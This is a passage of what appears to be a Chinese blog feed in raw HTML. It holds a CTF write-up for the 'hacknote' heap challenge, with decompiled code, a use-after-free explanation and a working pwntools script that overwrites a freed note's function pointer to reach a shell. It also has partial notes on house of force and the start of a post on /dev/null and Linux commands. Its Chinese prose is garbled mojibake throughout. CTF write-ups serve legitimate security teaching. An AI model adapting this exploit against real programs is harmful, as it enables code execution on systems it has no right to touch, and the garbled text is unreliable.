number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> print_note_content<span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Note size :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        size <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        v0 <span class="token operator">=</span> notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        v0<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//å†ä¸ºè¾“å…¥çš„å†…å®¹ï¼ˆcontentï¼‰ç”³è¯·ç©ºé—´</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alloca Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Content :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//è¯»å–å†…å®¹</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">++</span>count<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Full"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>deleteå‡½æ•°:</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">del_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">>=</span> count <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//å…ˆfreeæ‰content</span>    <span class="token function">free</span><span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">//å†freeè‡ªå·±</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>print_note:</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">print_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">>=</span> count <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__cdecl <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>è¿˜å¯ä»¥çœ‹åˆ°ä¸€ä¸ª<code>magicï¼ˆaddr = 0x08048986)</code>å‡½æ•°ï¼Œè€Œè¿™ä¸ªå‡½æ•°å°±æ˜¯æˆ‘ä»¬çš„ç›®æ ‡å“¦ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102205533.png" class="lazyload"></p><blockquote><p> è§£é¢˜é€»è¾‘ï¼šé€šè¿‡ä¸Šé¢å¯¹fastbinï¼Œuafçš„äº†è§£åï¼Œå¤§æ¦‚å¯ä»¥ç†è§£è¿™ä¸ªé¢˜ç›®çš„è§£é¢˜æ–¹æ³•äº†ã€‚æˆ‘ä»¬é¦–å…ˆè¦æ˜ç™½mallocå’Œfreeæœºåˆ¶ï¼Œå…ˆè¢«freeæ‰çš„å—ä¼šå¾ˆå¿«è¢«åº”ç”¨äºæ–°çš„mallocï¼Œå‰ææ˜¯å¤§å°åˆé€‚ï¼Œä¾‹å¦‚<code>free v1; v2 = malloc(4)</code>ï¼Œå¦‚æœåŸæ¥v1çš„å¤§å°ä¹Ÿä¸º4ï¼Œé‚£ä¹ˆv1åŸæ¥çš„é‚£å—å†…å­˜å°±ä¼šè¢«åˆ†é…ç»™v2ï¼Œé€šè¿‡v1å¯ä»¥ï¼ˆuafï¼‰è®¿é—®v2çš„å†…å®¹ã€‚</p><p>Fï¼ŒAï¼ŒUï¼ˆå…ˆFREE,å†ä¿®æ”¹chunkï¼Œè°ƒç”¨chunkä¸­çš„å‡½æ•°æŒ‡é’ˆï¼‰ã€‚è®©ä¸¤ä¸ªæŒ‡é’ˆå®é™…æŒ‡å‘åŒä¸€ä¸ªchunkï¼Œä¸€ä¸ªæŒ‡é’ˆæŠŠå†…å­˜è§£é‡Šä¸ºå­—ç¬¦ä¸²ï¼Œä»è€Œå†™å…¥ä»»æ„å€¼ï¼Œå¦ä¸€ä¸ªæŒ‡é’ˆæŠŠå†…å­˜è§£é‡Šä¸ºå‡½æ•°æŒ‡é’ˆï¼Œä»è€Œæ§åˆ¶äº†EIPã€‚</p></blockquote><h3 id="æ„é€ EXP"><a href="#æ„é€ EXP" class="headerlink" title="æ„é€ EXP"></a>æ„é€ EXP</h3><p>å€Ÿé‰´veritas501å¸ˆå‚…çš„EXPï¼Œç¨åŠ ä¿®æ”¹å’Œç†è§£ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>cn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./hacknote'</span><span class="token punctuation">)</span>bin <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./hacknote'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#æ·»åŠ </span><span class="token keyword">def</span> <span class="token function">add_note</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#åˆ é™¤â€”â€”free</span><span class="token keyword">def</span> <span class="token function">del_note</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#æ‰“å°</span><span class="token keyword">def</span> <span class="token function">print_note</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sizeéšæ„ï¼Œä¸ç­‰äº8å°±è¡Œ</span>add_note<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token string">'aaa'</span><span class="token punctuation">)</span>add_note<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token string">'bbb'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#contentçš„å¤§å°ä¸ç­‰äº8ï¼ˆè¿™æ˜¯ç¨‹åºä¸­note_chunkçš„å¤§å°,note_chunkå°±æ˜¯ç¬¬ä¸€æ¬¡mallocçš„é‚£ä¸ªï¼‰ï¼Œæ˜¯ä¸ºäº†ç­‰ä¼šåˆ†é…8 bytesçš„contentä¸ä¼šè¢«åˆ†é…åˆ°ä¹‹å‰çš„contentçš„binä¸Šï¼Œè€Œæ˜¯åˆ†é…åˆ°noteçš„binä¸Šã€‚</span><span class="token comment" spellcheck="true">#æŒ‰ç…§mallocå’Œfreeæœºåˆ¶ï¼Œå¦‚æœæˆ‘ä»¬del_noteæ¢ä¸€ä¸‹ä½ç½®ï¼Œå…ˆdel_note(1)ï¼Œnote2_chunkä¼šè¢«æ”¾åœ¨åŸæ¥çš„note0_chunkä½ç½®ï¼Œè€Œnote3_contenté‡Œçš„magicå‡½æ•°åœ°å€å°±ä¼šè¢«æ”¾åœ¨note1_chunkä½ç½®ï¼Œåé¢çš„print_note(0)ï¼ŒåŒæ ·ä¹Ÿéœ€è¦æ”¹ä¸ºprint_note(1)ï¼Œæ‰èƒ½getshell</span>del_note<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>del_note<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add_note<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span>bin<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'magic'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>print_note<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è¿è¡Œæ•ˆæœï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102214243.png" class="lazyload"></p><h2 id="lab11-bamboobox"><a href="#lab11-bamboobox" class="headerlink" title="lab11-bamboobox"></a>lab11-bamboobox</h2><h3 id="hof-house-of-force"><a href="#hof-house-of-force" class="headerlink" title="hof (house of force)"></a>hof (house of force)</h3><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/house_of_force.html" target="_blank" rel="noopener">heap-exploitationâ€”â€”house of forceå‚è€ƒé“¾æ¥</a></p><blockquote><p>å¼•ç”¨m4xå¤§ä½¬åšå®¢åŸè¯ï¼š</p><p>ç®€å•è¯´ä¸€ä¸‹æˆ‘å¯¹ hof çš„ç†è§£ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶ <strong>top_chunk</strong> çš„ <strong>size</strong>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ§åˆ¶ malloc ä¸€äº›ç²¾å¿ƒè®¾è®¡çš„<strong>å¤§æ•°/è´Ÿæ•°</strong>æ¥å®ç°æ§åˆ¶ top_chunk çš„æŒ‡é’ˆï¼Œå°±å¯ä»¥å®ç°ä»»æ„åœ°å€å†™çš„æ•ˆæœï¼Œä¸ªäººæ„Ÿè§‰ï¼Œhof çš„æ ¸å¿ƒæ€æƒ³å°±åœ¨è¿™ä¸ª force ä¸Šï¼Œç–¯ç‹‚ mallocï¼Œç®€å•ç²—æš´æ•ˆæœæ˜æ˜¾ã€‚</p></blockquote><h3 id="off-by-oneæ¼æ´"><a href="#off-by-oneæ¼æ´" class="headerlink" title="off_by_oneæ¼æ´"></a>off_by_oneæ¼æ´</h3><blockquote><p><a href="https://blog.csdn.net/nibiru_holmes/article/details/62040763" target="_blank" rel="noopener">å‚è€ƒé“¾æ¥</a></p><p>ä¸€ä¸ªå­—èŠ‚æº¢å‡ºè¢«ç§°ä¸ºoff-by-oneï¼Œæ›¾ç»çš„ä¸€æ®µæ—¶é—´é‡Œï¼Œoff-by-oneè¢«è®¤ä¸ºæ˜¯ä¸å¯ä»¥åˆ©ç”¨çš„ï¼Œä½†æ˜¯åæ¥ç ”ç©¶å‘ç°åœ¨å †ä¸Šå“ªæ€•åªæœ‰ä¸€ä¸ªå­—èŠ‚çš„æº¢å‡ºä¹Ÿä¼šå¯¼è‡´ä»»æ„ä»£ç çš„æ‰§è¡Œã€‚</p></blockquote><blockquote><p>==&gt; off-by-oneæ€»å…±å¯ä»¥åˆ†ä¸ºä¸¤ç§åˆ©ç”¨æ–¹å¼:</p><p><strong>chunk overlapping</strong></p><ul><li><p>off-by-one overwrite allocated</p></li><li><p>off-by-one overwrite freed</p></li><li><p>off-by-one null byte</p></li></ul><p><strong>unlink</strong></p><ul><li><p>off-by-one small bin</p></li><li><p>off-by-one large bin</p></li></ul></blockquote><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p><a href="https://github.com/bash-c/slides/blob/master/pwn_heap/malloc-150821074656-lva1-app6891.pdf" target="_blank" rel="noopener">unlinkâ€”â€”pdf</a></p><h3 id="æ£€æŸ¥ä¿æŠ¤æªæ–½-1"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½-1" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote><p>checksec it!</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102221726.png" class="lazyload"></p><p>å¼€å¯äº†NX,Stackï¼ŒåŒæ ·æ— æ³•é€šè¿‡å¸¸è§„æ–¹å¼æ¥æ”»å‡»ã€‚</p></blockquote><p>å¾…æ›´æ–°ã€‚ã€‚ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;â€¦â€¦&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="äºŒè¿›åˆ¶å®‰å…¨" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>/dev/nullå’Œå¸¸ç”¨linuxå‘½ä»¤é›†</title>
    <link href="http://www.yof3ng.xyz/2018/11/01/devnull%E5%92%8C%E5%B8%B8%E7%94%A8linux%E5%91%BD%E4%BB%A4%E9%9B%86/"/>
    <id>http://www.yof3ng.xyz/2018/11/01/devnullå’Œå¸¸ç”¨linuxå‘½ä»¤é›†/</id>
    <published>2018-11-01T15:16:26.000Z</published>
    <updated>2019-04-02T08:38:43.350Z</updated>
    
    <content type="html"><![CDATA[<p>/dev/nullå’Œå¸¸ç”¨linuxå‘½ä»¤é›†ã€‚</p><a id="more"></a><h1 id="dev-null"><a href="#dev-null" class="headerlink" title="/dev/null"></a>/dev/null</h1><blockquote><p>ğŸ˜­å› ä¸ºå¿˜äº†å‚è€ƒäº†å“ªäº›æ–‡ç« ï¼Œæ‰€ä»¥å¦‚è‹¥æœ‰ä¾µæƒä¹‹å¤„ï¼Œè¿˜è¯·è”ç³»åšä¸»ã€‚</p></blockquote><h2 id="dev-null-ä¸-é‡å®šå‘"><a href="#dev-null-ä¸-é‡å®šå‘" class="headerlink" title="/dev/null ä¸ é‡å®šå‘"></a>/dev/null ä¸ é‡å®šå‘</h2><p>==&gt; /dev/null æ˜¯linuxç³»ç»Ÿä¸­çš„ä¸€ä¸ªç‰¹æ®Šæ–‡ä»¶è®¾å¤‡ï¼Œä»–çš„ä½œç”¨æ˜¯æ¥å—ä¸€åˆ‡è¾“å…¥å®ƒçš„æ•°æ®å¹¶ä¸¢å¼ƒè¿™äº›æ•°æ®,é€šå¸¸è¢«å½“åšåƒåœ¾æ¡¶æ¥ç”¨ã€‚å°†è¾“å‡ºæµé‡å®šå‘åˆ°/dev/nullä¸Šé¢ï¼Œå°±æ˜¯ä¸¢å¼ƒè¿™ä¸ªè¾“å‡ºæµä¸Šçš„æ‰€æœ‰è¾“å‡ºï¼Œ/dev/nullä¹Ÿå«linuxä¸­çš„é»‘æ´ã€‚</p><p><strong>0:è¡¨ç¤ºé”®ç›˜è¾“å…¥(stdin)</strong></p><p><strong>1:è¡¨ç¤ºæ ‡å‡†è¾“å‡º(stdout),</strong>ç³»ç»Ÿé»˜è®¤æ˜¯1 </p><p><strong>2:è¡¨ç¤ºé”™è¯¯è¾“å‡º(stderr)</strong> </p><pre class=" language-bash"><code class="language-bash"><span class="token string">"command >/dev/null 2>&amp;1 &amp;"</span>  ä¸ <span class="token string">"command 1>/dev/null 2>&amp;1 &amp;"</span>  çš„æ„æ€ä¸€æ ·1<span class="token punctuation">)</span> command:   è¡¨ç¤ºshellå‘½ä»¤æˆ–è€…ä¸ºä¸€ä¸ªå¯æ‰§è¡Œç¨‹åº2<span class="token punctuation">)</span> <span class="token operator">></span>:  è¡¨ç¤ºé‡å®šå‘åˆ°å“ªé‡Œ 3<span class="token punctuation">)</span> /dev/null:  è¡¨ç¤ºLinuxçš„ç©ºè®¾å¤‡æ–‡ä»¶ 4<span class="token punctuation">)</span> 2:  è¡¨ç¤ºæ ‡å‡†é”™è¯¯è¾“å‡º5<span class="token punctuation">)</span> <span class="token operator">&amp;</span>1:  <span class="token operator">&amp;</span>è¡¨ç¤ºç­‰åŒäºçš„æ„æ€,  2<span class="token operator">></span><span class="token operator">&amp;</span>1è¡¨ç¤º2çš„è¾“å‡ºé‡å®šå‘äº16<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token keyword">:</span>  **è¡¨ç¤ºåå°æ‰§è¡Œ,å³è¿™æ¡æŒ‡ä»¤æ‰§è¡Œåœ¨åå°è¿è¡Œ** </code></pre><p>==&gt; æ¯”å¦‚ find -user root   2&gt;/dev/null  &gt;1.txt &amp;ï¼Œå°±æ˜¯å°†æ–‡ä»¶ç”¨æˆ·å±æ€§ä¸ºrootçš„æ–‡æ–‡ä»¶ååŠå…¶è·¯å¾„é‡å®šå‘åˆ°æ–‡ä»¶1.txtä¸­</p><p><strong>==&gt; ä½†æ˜¯</strong> find -user root   1&gt;/dev/null å´æ˜¯ä¸ä¸Šä¸€æ¡å‘½ä»¤ä¸åŒçš„ï¼Œç”¨çš„æ˜¯æ ‡å‡†è¾“å‡ºæµï¼Œä¸ä¼šæ˜¾ç¤ºåœ¨å±å¹•ä¸Šï¼Œåªèƒ½è¾“å‡ºåˆ°æ–‡ä»¶ä¸­ï¼›å¦‚æœåŠ ç‚¹ä¸œè¥¿ä¸Šå»å˜æˆ find -user root   1&gt;/dev/null 1&gt;&amp;2 é‚£ä¹ˆæ ‡å‡†è¾“å‡ºæµè¢«é‡å®šå‘åˆ°æ ‡å‡†é”™è¯¯è¾“å‡ºæµï¼Œå°±ä¼šåœ¨å±å¹•ä¸Šæ˜¾ç¤ºæŸ¥æ‰¾åˆ°çš„ä¿¡æ¯äº†ã€‚</p><p>==&gt; å†æ¯”å¦‚ grep -Ri woshiflag.py 2&gt;/dev/null 1&gt;&amp;2 ,å°±æ˜¯å°†ä¸woshiflag.pyè„šæœ¬æœ‰å…³çš„æ–‡ä»¶åˆ—å‡ºï¼Œå¹¶ä¸”å°†æ ‡å‡†è¾“å‡ºæµé‡å®šå‘åˆ°æ ‡å‡†é”™è¯¯è¾“å‡ºæµ,æ˜¾ç¤ºåˆ°å±å¹•ä¸Šã€‚</p><hr><pre class=" language-bash"><code class="language-bash">- <span class="token function">command</span> <span class="token operator">></span> <span class="token function">file</span> 2<span class="token operator">></span>file- <span class="token function">command</span> <span class="token operator">></span> <span class="token function">file</span> 2<span class="token operator">></span><span class="token operator">&amp;</span>1</code></pre><p><strong>ä¸åŒç‚¹: I/Oæ•ˆç‡ä¸Šçš„å·®å¼‚</strong> </p><p> ==&gt; command 1&gt;file 2&gt;file è¿™æ ·çš„å†™æ³•,stdoutå’Œstderréƒ½ç›´æ¥é€åˆ°fileä¸­, fileä¼šè¢«æ‰“å¼€ä¸¤æ¬¡,è¿™æ ·stdoutå’Œstderrä¼šäº’ç›¸è¦†ç›–,è¿™æ ·å†™ç›¸å½“ä½¿ç”¨äº†FD1å’ŒFD2ä¸¤ä¸ªåŒæ—¶å»æŠ¢å fileçš„ç®¡é“ã€‚ </p><p>==&gt; command 1&gt;file 2&gt;&amp;1 è¿™æ¡å‘½ä»¤å°±å°†stdoutç›´æ¥é€å‘file, stderr ç»§æ‰¿äº†FD1ç®¡é“å,å†è¢«é€å¾€file,æ­¤æ—¶,fileåªè¢«æ‰“å¼€äº†ä¸€æ¬¡,ä¹Ÿåªä½¿ç”¨äº†ä¸€ä¸ªç®¡é“FD1,å®ƒåŒ…æ‹¬äº†stdoutå’Œstderrçš„å†…å®¹ã€‚</p><p>==&gt; ä»I/O æ•ˆç‡ä¸Š,å‰ä¸€æ¡å‘½ä»¤çš„æ•ˆç‡è¦æ¯”åé¢ä¸€æ¡çš„å‘½ä»¤æ•ˆç‡è¦ä½,æ‰€ä»¥åœ¨ç¼–å†™shellè„šæœ¬çš„æ—¶å€™,æœ€å¤šçš„æ—¶å€™æˆ‘ä»¬ä¼šcommand 1&gt;file 2&gt;&amp;1 è¿™æ ·çš„å†™æ³•ï¼Œ æˆ– â€œcommand &gt;file 2&amp;1â€ </p><h1 id="linux-å¸¸ç”¨å‘½ä»¤é›†"><a href="#linux-å¸¸ç”¨å‘½ä»¤é›†" class="headerlink" title="linux å¸¸ç”¨å‘½ä»¤é›†"></a>linux å¸¸ç”¨å‘½ä»¤é›†</h1><h2 id="ç³»ç»Ÿä¿¡æ¯"><a href="#ç³»ç»Ÿä¿¡æ¯" class="headerlink" title="ç³»ç»Ÿä¿¡æ¯"></a>ç³»ç»Ÿä¿¡æ¯</h2><pre class=" language-bash"><code class="language-bash">arch æ˜¾ç¤ºæœºå™¨çš„å¤„ç†å™¨æ¶æ„<span class="token punctuation">(</span>1<span class="token punctuation">)</span> <span class="token function">uname</span> -m æ˜¾ç¤ºæœºå™¨çš„å¤„ç†å™¨æ¶æ„<span class="token punctuation">(</span>2<span class="token punctuation">)</span> <span class="token function">uname</span> -r æ˜¾ç¤ºæ­£åœ¨ä½¿ç”¨çš„å†…æ ¸ç‰ˆæœ¬ dmidecode -q æ˜¾ç¤ºç¡¬ä»¶ç³»ç»Ÿéƒ¨ä»¶ - <span class="token punctuation">(</span>SMBIOS / DMI<span class="token punctuation">)</span> hdparm -i /dev/hda 